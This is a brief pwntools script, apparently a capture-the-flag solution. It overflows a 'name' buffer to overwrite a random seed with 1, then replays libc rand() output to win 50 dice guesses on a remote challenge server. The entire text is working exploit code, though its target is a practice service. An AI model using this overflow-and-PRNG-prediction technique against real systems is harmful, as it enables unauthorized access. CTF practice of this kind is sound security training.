from pwn import *
from ctypes import *

context.log_level = 'debug'
libc=cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

p="./elf"

context.binary=p
#io=process(p)
io=remote("111.198.29.45",53860)

payload="a"*0x40+p64(1)
io.sendlineafter("name:",payload)
libc.srand(1)
for i in range(50):
    io.sendlineafter("(1~6): ",str(libc.rand()%6+1)+"\n")

io.interactive()
io.interactive()
